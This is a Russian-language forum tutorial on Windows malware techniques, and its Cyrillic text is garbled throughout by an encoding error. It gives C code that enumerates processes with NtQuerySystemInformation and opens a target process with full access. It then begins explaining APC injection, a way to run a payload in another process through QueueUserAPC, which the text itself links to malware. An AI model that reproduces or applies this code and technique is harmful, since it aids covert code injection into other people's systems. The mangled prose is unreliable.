<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ü—Ä–æ—Ü–µ—Å—Å–æ–≤ </b><br />
<br />
–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ –º–∞—Å—Å–∏–≤ —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω, —Å–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º –±—É–¥–µ—Ç –ø—Ä–æ—Ö–æ–¥ –ø–æ –Ω–µ–º—É —á—Ç–æ-–±—ã –Ω–∞–π—Ç–∏ –Ω—É–∂–Ω—ã–π ImageName.<br />
Buffer, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞. <b>–ù–∞ –∫–∞–∂–¥–æ–π –∏—Ç–µ—Ä–∞—Ü–∏–∏ –±—É–¥–µ—Ç –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—å—Å—è —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å —Ü–µ–ª–µ–≤—ã–º –∏–º–µ–Ω–µ–º –ø—Ä–æ—Ü–µ—Å—Å–∞.</b><br />
<br />
–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–∂–¥–æ–º—É —ç–ª–µ–º–µ–Ω—Ç—É —Ç–∏–ø–∞ SYSTEM_PROCESS_INFORMATION –≤ –º–∞—Å—Å–∏–≤–µ, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —á–ª–µ–Ω NextEntryOffset. –ß—Ç–æ–±—ã –Ω–∞–π—Ç–∏ –∞–¥—Ä–µ—Å —Å–ª–µ–¥—É—é—â–µ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞, –¥–æ–±–∞–≤—å—Ç–µ –∞–¥—Ä–µ—Å –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞ –∫ NextEntryOffset. –≠—Ç–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –≤ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// &#039;SystemProcInfo&#039; —Ç–µ–ø–µ—Ä—å –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç –Ω–æ–≤—ã–π —ç–ª–µ–º–µ–Ω—Ç –≤ –º–∞—Å—Å–∏–≤–µ
SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);</code></pre>
	</div>
</div><br />
<b>–û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏</b><br />
<br />
–ü–µ—Ä–µ–¥ –ø–µ—Ä–µ—Ö–æ–¥–æ–º SystemProcInfo –∫ –Ω–æ–≤–æ–º—É —ç–ª–µ–º–µ–Ω—Ç—É –≤ –º–∞—Å—Å–∏–≤–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –Ω–∞—á–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏, —á—Ç–æ–±—ã –æ—Å–≤–æ–±–æ–¥–∏—Ç—å –µ–≥–æ –ø–æ–∑–∂–µ. –°–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º —Ü–∏–∫–ª–∞ –∞–¥—Ä–µ—Å –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤–æ –≤—Ä–µ–º–µ–Ω–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ü–æ—Å–∫–æ–ª—å–∫—É –º—ã –±—É–¥–µ–º –∏–∑–º–µ–Ω—è—Ç—å &#039;SystemProcInfo&#039;, –º—ã —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ –Ω–∞—á–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ while-—Ü–∏–∫–ª–æ–º, —á—Ç–æ–±—ã –æ—Å–≤–æ–±–æ–¥–∏—Ç—å –µ–≥–æ –ø–æ–∑–∂–µ
pValueToFree = SystemProcInfo;</code></pre>
	</div>
</div><br />
<b>–ù–µ–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —á–∞—Å—Ç—å NtQuerySystemInformation</b><br />
<br />
NtQuerySystemInformation –æ—Å—Ç–∞–µ—Ç—Å—è –≤ –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ–π —Å—Ç–µ–ø–µ–Ω–∏ –Ω–µ–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º, –∏ –±–æ–ª—å—à–∞—è —á–∞—Å—Ç—å –µ–≥–æ –¥–æ —Å–∏—Ö –ø–æ—Ä –æ—Å—Ç–∞–µ—Ç—Å—è –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π. –ù–∞–ø—Ä–∏–º–µ—Ä, –æ–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ —á–ª–µ–Ω—ã Reserved –≤ SYSTEM_PROCESS_INFORMATION.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781536772.png"
		data-src="https://osint42.org/attachments/1746781536772-png.132/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781536772-png.132/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781536772.png"
			title="1746781536772.png"
			width="850" height="532" loading="lazy" />
	</div><br />
<br />
<b>–ü–æ–ª–Ω—ã–π –∫–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º NtQuerySystemInformation –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω –Ω–∏–∂–µ:</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

    fnNtQuerySystemInformation   pNtQuerySystemInformation = NULL;
    ULONG                        uReturnLen1               = NULL,
                                 uReturnLen2               = NULL;
    PSYSTEM_PROCESS_INFORMATION  SystemProcInfo            = NULL;
    NTSTATUS                     STATUS                    = NULL;
    PVOID                        pValueToFree              = NULL;

    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtQuerySystemInformation&quot;);
    if (pNtQuerySystemInformation == NULL) {
        printf(&quot;[!] GetProcAddress –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
        return FALSE;
    }

    pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        printf(&quot;[!] HeapAlloc –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
        return FALSE;
    }

    // –¢–∞–∫ –∫–∞–∫ –º—ã –±—É–¥–µ–º –∏–∑–º–µ–Ω—è—Ç—å &#039;SystemProcInfo&#039;, –º—ã —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ –Ω–∞—á–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ —Ü–∏–∫–ª–æ–º while, —á—Ç–æ–±—ã –æ—Å–≤–æ–±–æ–¥–∏—Ç—å –µ–≥–æ –ø–æ–∑–∂–µ
    pValueToFree = SystemProcInfo;

    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
    if (STATUS != 0x0) {
        printf(&quot;[!] NtQuerySystemInformation –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    while (TRUE) {

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–º–µ—Ä –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞
        // –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º –∏–º—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å –∑–∞–¥–∞–Ω–Ω—ã–º —Ü–µ–ª–µ–≤—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º
        if (SystemProcInfo-&gt;ImageName.Length &amp;&amp; wcscmp(SystemProcInfo-&gt;ImageName.Buffer, szProcName) == 0) {

            // –û—Ç–∫—Ä—ã–≤–∞–µ–º –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ –∏ –∑–∞–≤–µ—Ä—à–∞–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ
            *pdwPid        = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
            *phProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo-&gt;UniqueProcessId);
            break;
        }

        // –ï—Å–ª–∏ NextEntryOffset —Ä–∞–≤–µ–Ω 0, –º—ã –¥–æ—Å—Ç–∏–≥–ª–∏ –∫–æ–Ω—Ü–∞ –º–∞—Å—Å–∏–≤–∞
        if (!SystemProcInfo-&gt;NextEntryOffset)
            break;

        // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —ç–ª–µ–º–µ–Ω—Ç—É –≤ –º–∞—Å—Å–∏–≤–µ
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);
    }

    // –û—Å–≤–æ–±–æ–∂–¥–∞–µ–º –ø–∞–º—è—Ç—å, –∏—Å–ø–æ–ª—å–∑—É—è –Ω–∞—á–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —É–¥–∞–ª–æ—Å—å –ª–∏ –Ω–∞–º —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
–≠—Ç–æ—Ç –∫–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç NtQuerySystemInformation, —á—Ç–æ–±—ã –ø–µ—Ä–µ—á–∏—Å–ª–∏—Ç—å –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã, —Ä–∞–±–æ—Ç–∞—é—â–∏–µ –≤ —Å–∏—Å—Ç–µ–º–µ, –∏ –∑–∞—Ç–µ–º –∏—â–µ—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –Ω–∞ –æ—Å–Ω–æ–≤–µ –µ–≥–æ –∏–º–µ–Ω–∏ (szProcName). –ï—Å–ª–∏ —Ç–∞–∫–æ–π –ø—Ä–æ—Ü–µ—Å—Å –Ω–∞–π–¥–µ–Ω, —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –µ–≥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ (pdwPid) –∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä (phProcess). –ï—Å–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –ø—Ä–æ–∏–∑–æ—à–ª–∞ –∫–∞–∫–∞—è-–ª–∏–±–æ –¥—Ä—É–≥–∞—è –æ—à–∏–±–∫–∞, —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç FALSE.<br />
<br />
–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781548462.png"
		data-src="https://osint42.org/attachments/1746781548462-png.133/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781548462-png.133/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781548462.png"
			title="1746781548462.png"
			width="1282" height="496" loading="lazy" />
	</div></div>
						

							<h2>–ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É APC Injection</h2>

							

							

							<div class="bbWrapper">–ü—Ä–µ–¥–ª–∞–≥–∞—é –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ—Ç—å –æ–¥–∏–Ω —Å–ø–æ—Å–æ–± –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ <b><u>–±–µ–∑ —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞. –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –∏–∑–≤–µ—Å—Ç–µ–Ω –∫–∞–∫ APC-–∏–Ω—ä–µ–∫—Ü–∏—è.</u><br />
<br />
–ß—Ç–æ —Ç–∞–∫–æ–µ APC? –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–µ –≤—ã–∑–æ–≤—ã –ø—Ä–æ—Ü–µ–¥—É—Ä (APC)</b> ‚Äî —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã Windows, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º–∞–º –≤—ã–ø–æ–ª–Ω—è—Ç—å –∑–∞–¥–∞—á–∏ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ, –ø—Ä–æ–¥–æ–ª–∂–∞—è –≤—ã–ø–æ–ª–Ω—è—Ç—å –¥—Ä—É–≥–∏–µ –∑–∞–¥–∞—á–∏. APC —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã –∫–∞–∫ –ø—Ä–æ—Ü–µ–¥—É—Ä—ã –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞, –≤—ã–ø–æ–ª–Ω—è–µ–º—ã–µ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
–í—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å APC –¥–ª—è –ø–æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤ –æ—á–µ—Ä–µ–¥—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ –µ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ —Ä–∞—Å–ø–∏—Å–∞–Ω–∏—é.<br />
<br />
<b>–°–æ—Å—Ç–æ—è–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏</b><br />
<br />
–ù–µ –≤—Å–µ –ø–æ—Ç–æ–∫–∏ –º–æ–≥—É—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—É—é –≤ –æ—á–µ—Ä–µ–¥—å —Ñ—É–Ω–∫—Ü–∏—é APC, —ç—Ç–æ –º–æ–≥—É—Ç —Å–¥–µ–ª–∞—Ç—å —Ç–æ–ª—å–∫–æ –ø–æ—Ç–æ–∫–∏ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏. –¢–∞–∫–æ–π –ø–æ—Ç–æ–∫ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–µ–∂–∏–º–µ –æ–∂–∏–¥–∞–Ω–∏—è. –ö–æ–≥–¥–∞ –ø–æ—Ç–æ–∫ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏, –æ–Ω –ø–æ–º–µ—â–∞–µ—Ç—Å—è –≤ –æ—á–µ—Ä–µ–¥—å –≥–æ—Ç–æ–≤—ã—Ö –ø–æ—Ç–æ–∫–æ–≤, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –µ–º—É –≤—ã–ø–æ–ª–Ω—è—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ APC –∏–∑ –æ—á–µ—Ä–µ–¥–∏.<br />
<br />
<b>–ß—Ç–æ —Ç–∞–∫–æ–µ APC-–∏–Ω—ä–µ–∫—Ü–∏—è? </b><br />
<br />
–î–ª—è –ø–æ—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ñ—É–Ω–∫—Ü–∏–∏ APC –≤ –æ—á–µ—Ä–µ–¥—å –ø–æ—Ç–æ–∫–∞ –∞–¥—Ä–µ—Å —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–µ—Ä–µ–¥–∞–Ω –≤ QueueUserAPC WinAPI.<br />
<br />
–°–æ–≥–ª–∞—Å–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft:<br />
<br />
–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –ø–æ–º–µ—â–∞–µ—Ç APC –≤ –æ—á–µ—Ä–µ–¥—å –ø–æ—Ç–æ–∫–∞, –≤—ã–∑—ã–≤–∞—è —Ñ—É–Ω–∫—Ü–∏—é QueueUserAPC. –í—ã–∑—ã–≤–∞—é—â–∏–π –ø–æ—Ç–æ–∫ —É–∫–∞–∑—ã–≤–∞–µ—Ç –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ APC –≤ –≤—ã–∑–æ–≤–µ QueueUserAPC.<br />
<br />
–ê–¥—Ä–µ—Å –≤–Ω–µ–¥—Ä–µ–Ω–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥–µ—Ç –ø–µ—Ä–µ–¥–∞–Ω –≤ QueueUserAPC –¥–ª—è –µ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –ü–µ—Ä–µ–¥ —ç—Ç–∏–º –ø–æ—Ç–æ–∫ –≤ –ª–æ–∫–∞–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–µ—Ä–µ–≤–µ–¥–µ–Ω –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏.<br />
<br />
<b>QueueUserAPC</b><br />
<br />
QueueUserAPC –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ –∏ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 3 –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<br />
pfnAPC - –ê–¥—Ä–µ—Å –≤—ã–∑—ã–≤–∞–µ–º–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ APC.<br />
hThread - –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞, –Ω–∞—Ö–æ–¥—è—â–µ–≥–æ—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –∏–ª–∏ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
dwData - –ï—Å–ª–∏ —Ñ—É–Ω–∫—Ü–∏—è APC —Ç—Ä–µ–±—É–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –æ–Ω–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –ø–µ—Ä–µ–¥–∞–Ω—ã –∑–¥–µ—Å—å. –í –∫–æ–¥–µ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–∏ —ç—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ –±—É–¥–µ—Ç NULL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD QueueUserAPC(
[in] PAPCFUNC pfnAPC,
[in] HANDLE hThread,
[in] ULONG_PTR dwData
);</code></pre>
	</div>
</div><br />
<b>–ü–µ—Ä–µ–≤–æ–¥ –ø–æ—Ç–æ–∫–∞ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏</b><br />
<br />
–ü–æ—Ç–æ–∫, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—É—é –≤ –æ—á–µ—Ä–µ–¥—å —Ñ—É–Ω–∫—Ü–∏—é, –¥–æ–ª–∂–µ–Ω –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏. –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, —Å–æ–∑–¥–∞–≤ –ø–æ—Ç–æ–∫ –∏ –∏—Å–ø–æ–ª—å–∑—É—è –æ–¥–∏–Ω –∏–∑ —Å–ª–µ–¥—É—é—â–∏—Ö WinAPI:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>Sleep
SleepEx
MsgWaitForMultipleObjects
MsgWaitForMultipleObjectsEx
WaitForSingleObject
WaitForSingleObjectEx
WaitForMultipleObjects
WaitForMultipleObjectsEx
SignalObjectAndWait</code></pre>
	</div>
</div><br />
–≠—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏ –ø–æ—Ç–æ–∫–æ–≤ –∏ —É–ª—É—á—à–µ–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –∏ –æ—Ç–∫–ª–∏–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, –æ–¥–Ω–∞–∫–æ –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ñ–∏–∫—Ç–∏–≤–Ω–æ–≥–æ —Å–æ–±—ã—Ç–∏—è.<br />
–ü–µ—Ä–µ–¥–∞—á–∞ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è, —Ç–∞–∫ –∫–∞–∫ –ø—Ä–æ—Å—Ç–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –æ–¥–Ω–æ–π –∏–∑ —Ñ—É–Ω–∫—Ü–∏–π –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ –ø–æ—Ç–æ–∫–∞ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏.<br />
<br />
–î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–∏–∫—Ç–∏–≤–Ω–æ–≥–æ —Å–æ–±—ã—Ç–∏—è –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è WinAPI CreateEvent.<br />
<b>–ù–æ–≤—ã–π –æ–±—ä–µ–∫—Ç —Å–æ–±—ã—Ç–∏—è</b> ‚Äî —ç—Ç–æ –æ–±—ä–µ–∫—Ç —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ—Ç–æ–∫–∞–º –æ–±—â–∞—Ç—å—Å—è –º–µ–∂–¥—É —Å–æ–±–æ–π, —Å–∏–≥–Ω–∞–ª–∏–∑–∏—Ä—É—è –∏ –æ–∂–∏–¥–∞—è —Å–æ–±—ã—Ç–∏–π. –ü–æ—Å–∫–æ–ª—å–∫—É —Ä–µ–∑—É–ª—å—Ç–∞—Ç CreateEvent –Ω–µ –∏–º–µ–µ—Ç –∑–Ω–∞—á–µ–Ω–∏—è, –ª—é–±–æ–µ –¥–µ–π—Å—Ç–≤—É—é—â–µ–µ —Å–æ–±—ã—Ç–∏–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–µ—Ä–µ–¥–∞–Ω–æ —Ä–∞–Ω–µ–µ –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–º–∏ WinAPI.<br />
<br />
